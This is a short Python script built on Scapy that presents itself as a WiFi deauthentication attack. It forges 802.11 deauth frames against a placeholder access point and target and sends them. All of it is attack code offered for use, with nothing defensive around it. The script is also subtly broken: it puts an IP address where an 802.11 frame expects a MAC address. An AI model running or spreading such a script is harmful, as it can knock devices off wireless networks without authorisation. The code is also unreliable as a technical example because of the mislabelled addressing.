from scapy.all import *

def deauth_attack(bssid, target_ip):
    # Create a deauthentication packet
    pkt = RadioTap()/Dot11(addr1=bssid, addr2=target_ip, addr3=bssid)/Dot11Deauth()

    # Send the packet
    sendp(pkt, inter=0.1, count=10)

if __name__ == "__main__":
    # Replace with the BSSID of the target WiFi network and the IP address of the target device
    bssid = "00:11:22:33:44:55"
    target_ip = "192.168.1.100"

    print(f"Starting deauthentication attack on {bssid} with target IP {target_ip}...")
    deauth_attack(bssid, target_ip)
    print("Attack finished.")